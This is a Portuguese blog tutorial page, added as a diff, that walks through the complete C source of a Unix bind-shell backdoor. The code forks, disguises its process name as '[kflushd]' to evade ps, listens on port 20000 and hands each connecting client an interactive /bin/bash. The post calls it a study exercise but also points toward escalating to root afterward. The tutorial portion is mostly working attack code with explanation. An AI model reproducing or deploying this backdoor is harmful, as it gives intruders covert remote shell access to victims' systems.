@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>writing backdoor in C sockets berkeley [UNIX] 0xc6</title>
+	
+	<meta name="author" content="mh4x0f">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/mh4x0f">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/mh4x0f">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:mh4root@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" />
+				
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" style="width:112px;height:112px;" />
+	</a>
+	<h3 class="title">
+        <a href="/"></a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	One 0x41414141 worth a thousand words
+</div>
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/mh4x0f">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/mh4x0f">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:mh4root@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<form class="col-lg-12" action="http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity" method="post" target="popupwindow" onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity', 'popupwindow', 'scrollbars=yes,width=250,height=220');return true" >
+			<div class="input-group" style="width:240px;text-align:center;margin:0 auto;">
+			<input type="hidden" value="chmodsecurity" name="uri" >
+		  <input type="hidden" name="loc" value="pt_BR">
+		  <input  id="input-rss"  style="width:160px;text-align:center;" placeholder="Digite  seu e-mail" class="form-control input-lg" type="text" name="email">
+		  <span class="input-group-btn"><button id="btn-assinar" class="btn btn-lg btn-primary"  type="submit" value=" ASSINAR ">Assinar</button></span>
+	      </div>
+		</form>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>writing backdoor in C sockets berkeley [UNIX] 0xc6 </h1>
+</div>
+	
+<article>
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   August 
+	   7th,
+	   
+	   2014
+	 </span>
+	  <div class="article_body">
+	  <p>Continuando com nosso artigos sobre <a>C</a>, depois de um keylogger vamos brincar mais um pouco com socket's, primeiro o que é um backdoor ? , também conhecido como portas dos fundos, não o canal no youtube tou falando sem humor aqui o blackdoor é de titânio. O backdoor o que ele faz é criar um processo que levante um serviço que devolve uma shell para o atacante, certamente vai fazer uma conexão reversa ou direta(bind), hoje em dia é comum achar apenas para conexão reversa pois de uns anos pra cá ouve a necessidade de a vitima se conectar ao atacante isso tudo pelo fato dos IPs dinâmicos, que mudam constantemente, mas em servidores WEB são muito comum ataque desse tipo já o IP torna-se estático. Qual a utilidade de aprender a criar um backdoor ? meu amigo, quando você entende como criar um backdoor isso exige um conhecimento básico em redes + algumas coisa sobre programação digamos que básico também, a criação de um backdoor para estudos nós dar uma ideia de como funciona os Trojan e backdoor sofisticados que são usando no mercado negro alguns com funções que da pra comprar com Trojan, fora que você pode está desenvolvendo outras coisas que ao meu ver pode ajuda-lo na busca de conhecimento. Tranquilo ? beleza...</p>
+<p>Os Headers</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="c1">// Retire os espaço dos header&#39;s</span>
+<span class="cp">#include &lt; stdio.h &gt;</span>
+<span class="cp">#include &lt; stdlib.h &gt;</span>
+<span class="cp">#include &lt; errno.h  &gt;</span>
+<span class="cp">#include &lt; strings.h &gt;</span>
+<span class="cp">#include &lt; netinet/in.h &gt;</span>
+<span class="cp">#include &lt; sys/socket.h &gt;</span>
+<span class="cp">#include &lt; sys/types.h &gt;</span>
+<span class="cp">#include &lt; signal.h &gt;</span></code></pre></div>
+
+<p>Basicamente todos os header ja conhecemos, com exerção de alguns como <a>signal.h</a> a ideia de usa-lo é para tratar alguns erro de hardware que possa fazer com que nosso backdoor não funcione corretamente tipo A função signal() associa um comportamento que o processo deve ter ao receber o sinal, que pode ser o comportamento padrão, ignorar o sinal ou executar uma função específica. Em especial os sinais SIGKILL e SIGSTOP não podem ser tradados com uma função ou ignorados, é bem comum ver SIGSEGV em muitos programas maliciosos, até porque não é vindo uma Falha de segmentação que interrompe a execução por violação de memoria e etc... o cabeçalho errno.h como nome já diz tratamento de erro, pode-se usar perror.h também é escolha . quando importamos essa biblioteca é necessário importa outras que vão ajudar no tratamento como stdio.h para os printf que auxilia no tratamento da saída da msg e e strerror definida em string.h que fornece a string de caracteres com a mensagem de erro. </p>
+<pre class="brush: c; gutter: false;">
+#define MINHA_PORTA 20000 /* A porta do servidor */
+#define BACKLOG        5 /* Até quantas conexões */
+
+int main(int argc, char *argv[])
+{
+
+	int Meusocket, Novosocket, tamanho;
+	struct sockaddr_in local;
+	struct sockaddr_in remote;
+</pre>
+<p>Se você já acompanha nossa serie sobre socket em C não ter problemas algum com esses códigos acima, não tem nenhuma diferença. mas explicando assim mesmo criamos dois descritor ou dois socket e uma variável tamanho, essa variável tamanho vai ser usada na função  accept()  se não lembra int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); é preciso calcular o tamanho da estrutura addr que nesse caso vai ser nosso endereço, e temos a criação das duas estruturas a local e remota.</p>
+<pre class="brush: c; gutter: false;">
+/* Cria um processo crianca ou menor, para não necessitar executar
+	   usando &amp; */
+	if(fork() == 0){
+		strcpy(argv[0], "[kflushd]");
+		signal(SIGCHLD, SIG_IGN);
+	
+		/* Criando a estrutura local(servidor) */
+	
+		bzero(&amp;local, sizeof(local));
+		local.sin_family = AF_INET;
+		local.sin_port = htons(MINHA_PORTA);
+		local.sin_addr.s_addr = INADDR_ANY;
+		bzero(&amp;(local.sin_zero), 8);
+
+</pre>
+<p> A syscall fock() é usada para criar processo, lá do nosso header <a>sys/types.h</a>. Ela não tem argumento e sempre retorna o PID do processo ela retorna uma valor positivo, nesse caso vamos criar um processo filho se ele voltar  0 quer dizer que nosso processo filho foi criado com sucesso :D  Unix fará uma exata cópia do espaço de endereço do pai e dá-lo à criança. Portanto, os processos pai e filho têm separado espaços de endereçamento. Logo em seguida vem a manha( R1,R1,O R2, cima,baixo,cima,baixo,cima,baixo). se você teve infância verá que é a manha de tirar a polícia no GTA Sanadreas, é a mesma coisa que estamos fazendo ali em cima, vamos supor que a vitima tente dar uma de espertinha e dar um ps aux no terminal para ver os processo e achar e matar nosso backdoor, a ideia é mudar o nome do nosso backdoor para <a>kflushd</a> ou qualque nome de processo que seja nativo do Unix um daemon da vida também pode ajudar. Agora vem nossa estrutura local, como assim ? vai me dizer que já esqueceu precisamos definir o que vamos criar bzero() já falei sobre ela  pode-se usar memset() o compilador não vai reclamar, mas bzero é mais eficiente devido ao fato de que é apenas nunca vai ser zerar a memória, então ele não tem que fazer qualquer verificação adicional que memset pode fazer. Isso ainda não significa necessariamente parecer uma razão absolutamente não usar memset para zerar a memória embora. em seguida, definimos a familia do socket e convertermos o valor da variável <a>MINHA_PORTA</a> com a função htons(), que converte os valores entre o host e network byte order. definimos o IP e preenchermos de zero nossa estrutura para fechar os 16 bytes :D.</p>
+<pre class="brush: c; gutter: false;">
+/* Declaração do socket(),bind() e listen() */
+
+		Meusocket=socket(AF_INET, SOCK_STREAM, 0);
+		bind(Meusocket, (struct sockaddr *)&amp;local, sizeof(struct sockaddr));
+		listen(Meusocket, BACKLOG);
+		tamanho = sizeof(struct sockaddr_in);
+	
+
+</pre>
+<p>E agora declaração das conexões, definimos nosso descritor, criamos o bind() int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen); A bind() é a mesma coisa que ligar() quando criamos um socket() não tem nenhuma atribuição dos nosso dados local, ou seja, a nossa estrutura precisa ser atribuída, especificado por addr ào socket referido pelo descritor de arquivo sockfd que é nosso descritor  Meusocket. addrlen especifica o tamanho, em bytes, da estrutura de endereço apontado pelo addr . tradicionalmente, esta operação é chamada de "atribuir um nome de um socket". lembra logo no início do nosso código definirmos uma viriável BACKLOG ela determinará a quantidade de cliente que podem se conectar ao meu backdoor. é preciso passar dois argumentos int listen(int sockfd, int backlog); o nosso descritor e inteiro que é a quantidade. depois vem o uso da variável tamanho que calcula o tamanho da estrutura socketaddr_in() que vai ser usado logo em seguida pelo nosso novosocket's criado.</p>
+<pre class="brush: c; gutter: false;">
+while(1)
+		{
+			if((Novosocket=accept(Meusocket, (struct sockaddr *)&amp;remote,&amp;tamanho))==1)
+			{
+				perror("accept");
+				exit(1);
+			}
+	
+			if(!fork())
+			{
+				close(0); close(1); close(2);
+		
+				/* dup2() aqui é usado para criar uma copia de Novosocket */
+		
+				dup2(Novosocket, 0); dup2(Novosocket, 1); dup2(Novosocket,2);
+		                   /* Entao a shell é executada, nesse caso uma bash
+				   Mude-a para qualquer uma que quiser, e atenção ao
+				   parâmetro -i, nem todas aceitam shell interativa */
+				execl("/bin/bash","bash","-i", (char *)0);
+				close(Novosocket);
+				exit(0);
+			}
+	
+		}
+	}
+	return(0);
+}
+</pre>
+<p>Agora vem onde acontece nossa shell até ia tudo bem virmos coisas que já conhecemos agora a coisa muda e ao mesmo tempo fica simples de entender, comecarmos logo com um while true logo depois do accept() sempre você verá algum do tipo, há muitos jeitos de fazer o mesmo fazer com que o programa nos devolva um shell seja ela por meio de um comando system()  ou execl, você pode encontrar outros backdoor com mensagem como assim mensagem, isso mesmo podemos fazer um programa tipo um chat , mas quando recebermos tal mensagem ativamos a nossa shellcode tipo assim "execute:ls -ln", já demostrei algum do tipo em python, em C não muda nada é  mesmo esquema. Em seguida, usamos a função fock() , é o mesmo esquema mandamos ela criar um processo filho, para executar nossa shell,caso ele não consiga criar ele vai sair, até porque não temos o <a>else{}</a> se ele voltar -1 no caso. Agora vem os  close() que fecha o descritor de arquivo associado com a saída padrão para o processo atual, re-atribui a saída padrão para um novo descritor de arquivo e fecha o descritor de arquivo original, isso é preciso pois vamos fazer uma copia usável do novosocket() quando você usa o fock() você pode fazer duas coisas A primeira é a de abrir / dev / tty que lhe dará acesso ao seu dispositivo terminal (assumindo que o dispositivo de terminal é o que você quer em vez do identificador de arquivo original). A segunda é a dup que identificador de arquivo antes de fechá-lo para que você tenha uma cópia utilizável. Então, você pode usar dup2 para obtê-lo de volta. Nesse caso usamos o dup2() apenas para copiar nosso novosocket que está sendo usado na conexão.Já o execl() lógico executa um comando , nesse caso uma shell interativa -i, O último parâmetro deve ser sempre 0. É um terminador NULL . Uma vez que a lista de argumentos é variável que deve ter alguma maneira de dizer C quando está para acabar. O terminador NULL faz este trabalho.onde caminho aponta para o nome do arquivo contendo um comando que deve ser executado, argo aponta para uma string que é o mesmo que caminho (ou pelo menos o seu último componente. arg1 ... argn são ponteiros para argumentos para o comando e 0 simplesmente marca o final da lista (variável) de argumentos. depos fechamos nosso socket's. agora é só testar :D. é isso um backdoor para estudos entender como funciona, em breve veremos outro vamos dizer que avançado, isso é tudo pessoal, lembre-se  usem porta do acima de 1024 já que com elas pode executar sem ter privilégios root, depois da pra tentar fazer o root verificando a versão do kernel.
+Referências:</p>
+<pre>
+Nash Leon 
+http://www-usr.inf.ufsm.br/~giovani/sockets/sockets.txt
+http://gnosis.cx/publish/programming/sockets.html
+http://www.csd.uoc.gr/~hy556/material/tutorials/cs556-3rd-tutorial.pdf
+</pre>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#c programming-ref">
+					c programming <span>(7)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#sockets-ref">
+					sockets <span>(1)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#berkeley-ref">
+					berkeley <span>(1)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#unix-ref">
+					unix <span>(1)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#backdoor-ref">
+					backdoor <span>(1)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#198-ref">
+					198 <span>(1)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#C-ref">
+					C <span>(2)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=writing backdoor in C sockets berkeley [UNIX] 0xc6&via=mh4x0f"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="http://avatars.githubusercontent.com/u/6795613" style="width:80px;height:80px;" class="img-rounded author-image" />
+        <h4 class="section-title author-name">mh4x0f</h4>
+        <p class="author-bio">One 0x41414141 worth a thousand words</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/asm/2014/08/07/Tecnicas%20Avancadas%20Shellcoding%20%5BAssembly%5D.html" title="Tecnicas Avançadas Shellcoding [asm]">&larr; Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="/assembly/2014/08/24/writing-backdoor-in-ASM-linux-64-bits-sycall-Netcat.html" title="writing backdoor in ASM linux 64 bits sycall Netcat">Next &rarr;</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+    
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'mh4x0fblog';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2015 mh4x0f with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  var _gaq = _gaq || [];
+  var pluginUrl =
+ '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+  _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+  _gaq.push(['_setAccount', 'mh4x0f']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
